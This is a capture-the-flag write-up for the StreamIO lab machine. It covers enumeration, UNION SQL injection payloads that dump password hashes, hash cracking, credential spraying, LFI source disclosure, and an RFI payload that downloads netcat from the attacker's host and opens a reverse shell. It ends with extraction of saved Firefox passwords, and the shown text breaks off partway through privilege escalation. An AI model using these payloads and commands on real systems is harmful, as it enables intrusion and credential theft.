Box: Windows
Level: Medium
### Index
1.  Box Info
2.  [Initial Nmap Scan](#Initial%20Nmap%20Scan)
3. [Web Enum - Port 80 and 443](#Web%20Enum%20-%20Port%2080%20and%20443)
	1. [`Port 443 - https://streamio.htb/ Enum`](#`Port%20443%20-%20https%20//streamio.htb/%20Enum`)
	2. [`GoBuster on https://streamio.htb`](#`GoBuster%20on%20https%20//streamio.htb`)
	3. [`Enum /admin Directory for http://streamio.htb/`](#`Enum%20/admin%20Directory%20for%20http%20//streamio.htb/`)
	4. [`Port 443 watch.streamio.htb GoBuster`](#`Port%20443%20watch.streamio.htb%20GoBuster`)
4. [`SQL Injection`](#`SQL%20Injection`)
	1. [`UNION Injection`](#`UNION%20Injection`)
	2. [Finding the DB Version](#Finding%20the%20DB%20Version)
	3. [`Trying the above creds on SMB using netexec`](#`Trying%20the%20above%20creds%20on%20SMB%20using%20netexec`)
	4. [`Hydra to try credentals in web login form`](#`Hydra%20to%20try%20credentals%20in%20web%20login%20form`)
	5. [`Downloading PHP Source Code From Web Server using Base64 Encoding Filter`](#`Downloading%20PHP%20Source%20Code%20From%20Web%20Server%20using%20Base64%20Encoding%20Filter`)
	6. [`Grabbing the Reverse Shell - Remote File Inclusion (RFI) Payload`](#`Grabbing%20the%20Reverse%20Shell%20-%20Remote%20File%20Inclusion%20(RFI)%20Payload`)
5. [Further Enumeration to capture User Flag](#Further%20Enumeration%20to%20capture%20User%20Flag)
	1. [`Executing Query using SQLCMD on Target`](#`Executing%20Query%20using%20SQLCMD%20on%20Target`)
	2. [`Executing Query using SQLCMD on Target`](#`Executing%20Query%20using%20SQLCMD%20on%20Target`)
	3. [`User Flag Captured`](#`User%20Flag%20Captured`)
6. [Privilege Escalation](#Privilege%20Escalation)

### Box Info
```
StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password.
```

### Initial Nmap Scan
```
# nmap -p- -Pn streamio.htb                                      
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49704/tcp open  unknown
```

```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn streamio.htb
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-10 10:31:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-09-10T10:33:06+00:00; +1h45m04s from scanner time.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Streamio
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
```

Notice the `DNS:watch.streamIO.htb` in the port 443. Let's add it to our host file.
### Web Enum - Port 80 and 443

The Port 80 was showing IIS Landing page. Nothing Interesting there. The Port 443 shows a Movie web site. We also have a  `https://watch.streamio.htb` where another app is running for streaming movies. 
###### `Port 443 - https://streamio.htb/ Enum`
```
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.2.26
Set-Cookie: PHPSESSID=e5eg9jbrpj4m2l330v97c6ngsj; path=/
X-Powered-By: ASP.NET
```

We have a feedback from two users. It can be potential users on the target.
![](StreamIO_Web0.png)

About Us Page Shows some more users.
![](StreamIO_Web1.png)

###### `GoBuster on https://streamio.htb`
```
# gobuster dir -u https://streamio.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
```

The `/admin` directory throws the `FORBIDDEN` Page. 
###### `Enum /admin Directory for http://streamio.htb/`
```
# gobuster dir -u https://streamio.htb/admin/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt  -k -x php,php5 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,php5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/master.php           (Status: 200) [Size: 58]
/index.php            (Status: 403) [Size: 18]
```

Looking at `master.php` 
![](StreamIO_Web2.png)

###### `Port 443 watch.streamio.htb GoBuster`
```
# gobuster dir -u https://watch.streamio.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,conf,zip,inc,ini
Nothing Interesting other than search.php
```

### `SQL Injection`

Upon looking at the `https://watch.streamio.htb/search.php`, We notice that we were able to filter the movie name using the given textbox. If you type `days`, It will filter out movies that has a word `days` in it.
![](StreamIO_SQL0.png)

So, In a the backend, The SQL query would be prepared something as follows
`SELECT Movie_Name,year,watch_id from Movies where Movie_name contains 'text.value';`. 
This is just an assumption. Also, Notice that the list are `ORDER BY` so there must be a `ORDER BY` at the end of the SQL Query.

Cool We can frame an SQL Injection attack. Let's first verify if it is even possible or not. So looking at our assumed SQL Queries, I will try to find out the list of a movie name that ends with the word `days` using the SQL Injection Payload. Plus the end portion `ORDER BY` of the SQL query will be commented out so the list should not be in the ordered list. 
`Payload: day';-- -`
![](StreamIO_SQL1.png)

It does pull out the list and notice that it is not sorted. We can confirm that this is a SQL Injection because if there's no SQL Injection than we would have got ZERO result as there is no movie name that ends with `';-- -` in the movie name field. Plus the `ORDER BY` is commented out based on the output. If you just put `';-- -` in the textbox, It does list out all the movies.

###### `UNION Injection`
Let's try out the UNION Injection.
`Payload: abcd' union select 1,2,3,4,5,6-- -`
![](StreamIO_SQL2.png)

If you notice that my payload change from `day` to `abcd` is because the `day' union select 1,2,3,4,5,6;-- -` was not working. I don't know why. Upon searching just `abcd` there was no movie listed. So I will continue with abcd.

###### Finding the DB Version
`Payload: abcd' UNION SELECT 1,@@VERSION,3,4,5,6;-- -`
![](StreamIO_SQL3.png)
 We got SQL Server 2019 with the server version. Let's Find out the databases.

`Payload: abcd' UNION SELECT 1,name,3,4,5,6 from master..sysdatabases;-- -`
![](StreamIO_SQL4.png)
We have found the list of databases. Let's find out which one of this is currently selected database.

`Payload: abcd' UNION SELECT 1,(select DB_NAME()),3,4,5,6;-- -`
![](StreamIO_SQL5.png)
Our currently selected database is `STREAMIO`. Let's first dig into it and find the list of tables.

`Payload: abcd' UNION SELECT 1,name,3,4,5,6 from STREAMIO..sysobjects;-- -`
![](StreamIO_SQL6.png)
We got the list of tables along with their IDs. Out of this list the `PK_users` and `users` table seems important where we can find user information. Let's dig into it using table ID. The reason I pull out ID is because it is useful when pulling out data from the table using ID.

`Payload: abcd' UNION SELECT 1,name,id,4,5,6 from STREAMIO..syscolumns where id in(901578250);-- -`
![](StreamIO_SQL7.png)
We got our column name with their respective IDs as well. The column `username` and `password` where we are going to focus now.

`Payload: abcd' UNION SELECT 1,concat(username,':',password),3,4,5,6 from users;-- -`
![](StreamIO_SQL8.png)

The list is too long but we got the user hash. These are all MD5 hashes. After trying to crack each of this hash with `hashcat`, I was able to cracked the following hashes for the users.
```
# hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
74b87337454200d4d33f80c4663dc5e5:aaaa
665a50ac9eaa781e4f7f04199db97a11:paddpadd
912ec803b2ce49e4a541068d495ab570:asdf
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
3577c47eb1e12c8ba021611e1280753c:highschoolmusical
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

Out of all the hashes, I was able to crack the hashes in the above list.

###### `Trying the above creds on SMB using netexec`

So i have two separate files that I prepared. One contain `username:hashes`  and another one contains `hashes:cracked_password` we will prepare username and password file from this.
```
# more user_hashes userpass 
::::::::::::::
user_hashes
::::::::::::::
aaaa :74b87337454200d4d33f80c4663dc5e5
admin :665a50ac9eaa781e4f7f04199db97a11
<<SNIPPED FOR BREVITY>>
::::::::::::::
userpass
::::::::::::::
74b87337454200d4d33f80c4663dc5e5:aaaa
665a50ac9eaa781e4f7f04199db97a11:paddpadd
<<SNIPPED FOR BREVITY>>

# cat user_hashes | cut -d: -f1 > username
# cat username 
aaaa 
admin 
Alexendra 
<<SNIPPED>

# cat userpass | cut -d: -f2 > password
# cat password                         
aaaa
paddpadd
asdf
<SNIPPED>
```

`Using Username and Password list to try on smb for each user with each password`
```
# netexec smb 10.10.11.158 -u username -p password --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\aaaa:aaaa STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:aaaa STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Alexendra:aaaa STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\asdf:aaaa STATUS_LOGON_FAILURE 
```
If you use `--no-bruteforce` in the above command than make sure the file entries in the username and password file are exactly the same. 
###### `Hydra to try credentals in web login form`
After having the credentials from the database, We would need to figure out the correct credentials that would work on the `http://streamio.htb/login` page. We will use `Hydra` to figure it out. But First we will prepare the username and password list. Let's first prepare files
```
# cat user_pass                           
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
dfdfdf:ae27a4b4821b13cad2a17a75d219853e:dfdfdf
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..

# cat user_pass | cut -d: -f1 > user
# cat user_pass | cut -d: -f1 > pass
# cat user_pass | cut -d: -f1,3 > userpass
# cat userpass                                 
admin:paddpadd
Barry:$hadoW
Bruno:$monique$1991$
Clara:%$clara
dfdfdf:dfdfdf
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

Now we will use Hydra's `https-post-form` Module to try each of the above creds on the `http://stream.htb/login.php` form.
```
# hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-10 20:33:13
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-10 20:33:14
```
We found that the password for user `Yoshihide` would work on the login form. And we were able to load the Admin Panel as well.

![](StreamIO_LFI0.png)

Each parameter `?user=`, `?staff=` and `?movie=` loads a different page. A good point to FUZZ this parameter to uncover any hidden page.
###### `Downloading PHP Source Code From Web Server using Base64 Encoding Filter`
```
# wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -H "Cookie: PHPSESSID=onjq5t2fptg8femj7s4g3bi8as" -u 'https://streamio.htb/admin/?FUZZ=' --hw 131
000000125:   200        146 L    349 W      4670 Ch     "user"                                                                                           
000000245:   200        398 L    916 W      12484 Ch    "staff"                                                                                          
000001068:   200        10790    25878 W    320235 Ch   "movie"                                                                                          
000005776:   200        49 L     137 W      1712 Ch     "debug"   
```

Loading the `?debug=` page shows that `this option is for developers only.` When I try to `https://streamio.htb/admin/?debug=master.php`, It just prints the list of all the movies. We can try plethora of things on `?debug=`. Since our intention is to grab the source code, We will have to find a way to grab the code. `Base64` is the answer. We can always try to get the file content by encoding it to `Base64` using PHP Filters. 

`https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`
![](StreamIO_LFI1.png)

Once you copy it and decode it to Base64, you'll get a plain source code. We can do the same for `https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php` file.

`master.php`
```
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?> 
```
At the bottom of the Master.php file, I notice this piece of code where the `file_get_contents` function is being called with `$_POST['include']` parameter. We have done this in the past for one of the HTB boxes only. But long story short, we would be able to execute through this parameter.

`index.php`
```
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
```

Creds found in index.php but not Winrm Shell yet. Not Even smb.

###### `Grabbing the Reverse Shell - Remote File Inclusion (RFI) Payload`
Now that we know what we can do with the `?debug=` and `$_POST['include']` parameters, Let's try to first execute simple command. Since this isn’t being included on the webserver, but rather passed through `eval` function, I won’t need the `<?php` and `?>`. 
```
# cat rce.php       
system("whoami");
```

![](StreamIO_LFI3.png)

We got RCE. We now know that the web application is running under the user `yoshihide` user. We can not grab the shell.

```
# cat rce.php      
system("powershell -c wget http://10.10.14.8/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.8 4444");
```

![](StreamIO_LFI4.png)

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.158] 53540
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
```

### Further Enumeration to capture User Flag

I upload `where.exe` on to our targe and found the SQL CMD is already installed on the box. I first check the list of Software installed in Program Files.
```
PS C:\ProgramData> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```

We can use `SQLCMD.exe` and explore other database. For Instance, During the enumeration through SQL Injection, We found that we `streamio_Backup` Database present as well.  
```
S C:\ProgramData> sqlcmd /?
sqlcmd /?
Microsoft (R) SQL Server Command Line Tool
Version 15.0.2000.5 NT
Copyright (C) 2019 Microsoft Corporation. All rights reserved.

usage: Sqlcmd            [-U login id]          [-P password]
  [-S server]            [-H hostname]          [-E trusted connection]
  [-N Encrypt Connection][-C Trust Server Certificate]
  [-d use database name] [-l login timeout]     [-t query timeout]

< Snipped >
```

**Remember: We also have credentials for db_admin user from `index.php` file above.** We will use that credentials
###### `Executing Query using SQLCMD on Target`
```
PS C:\ProgramData> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users  
```

```
PS C:\ProgramData> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "use streamio_backup;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "use streamio_backup;"
Changed database context to 'streamio_backup'.
```

```
PS C:\ProgramData> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
```

Looks like MD5. Let's grab it for the user `nikk37`.

```
# hashcat -m 0 -a 0 389d14cb8e4e9b94b137deb1caf0612a /usr/share/wordlists/rockyou.txt --show
389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
```

###### `User Flag Captured`
```
# evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ..
*Evil-WinRM* PS C:\Users\nikk37> cd Desktop
*Evil-WinRM* PS C:\Users\nikk37\Desktop> type user.txt
a728ba3904c367aa3e0facd38e96dcb3
*Evil-WinRM* PS C:\Users\nikk37\Desktop>
```

### Privilege Escalation

###### `winPEAS Findings`
```
COMPUTERNAME: DC
PSModulePath: C:\Users\nikk37\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules; C:\Windows\system32\WindowsPowerShell\v1.0\Modules; C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\

############ Looking for Firefox DBs
#  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
# Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

############ Found Database Files
File: C:\Users\All Users\Microsoft\Windows\Caches\cversions.2.db
File: C:\Users\All Users\Microsoft\Windows\Caches\{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000002.db
File: C:\Users\All Users\Microsoft\Windows\Caches\{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000002.db
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\cert9.db
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\ls-archive.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\2918063365piupsah.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\3561288849sdhlie.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage\default\moz-extension+++f5b2b34a-aa3b-42c6-864b-15a8a1f16c4f^userContextId=4294967295\idb\3647222921wleabcEoxlt-eengsairo.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\content-prefs.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\cookies.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\favicons.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\formhistory.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\permissions.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\places.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\storage.sqlite
File: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\webappsstore.sqlite

########## Found Password Files Files
File: C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

```

Seem like we are going to deal with Firefox database. We've done this one in the past for [Heist.htb](https://github.com/ring-buffer/Red_Team_Notes/blob/main/Windows-HTB-Boxes/Heist%20HTB.md).  Our user nikk37 has a Firefox db present on the target.

We are going to use [Firepwd](https://github.com/lclevy/firepwd) An open source tool to decrypt the Mozilla Firefox password. Also we will grab the two files `key4.db` and `logins.json`. 

```
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.14.8\share
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.14.8\share
```

Putting the `key4.db` and `Logins.json` in the same directory where the `firepwd` was git cloned.
```
┌──(root㉿kali)-[/home/ringbuffer/Downloads/StreamIO.htb/firepwd]
└─# mv ../key4.db .           

┌──(root㉿kali)-[/home/ringbuffer/Downloads/StreamIO.htb/firepwd]
└─# mv ../logins.json .
```

```
# python firepwd.py       
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Using NetExec to validate the above credentials.
```
# more f_user f_pass 
::::::::::::::
f_user
::::::::::::::
admin
nikk37
yoshihide
JDgodd
::::::::::::::
f_pass
::::::::::::::
JDg0dd1s@d0p3cr3@t0r
n1kk1sd0p3t00:)
paddpadd@12
password@12

# netexec smb 10.10.11.158 -u f_user -p f_pass --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
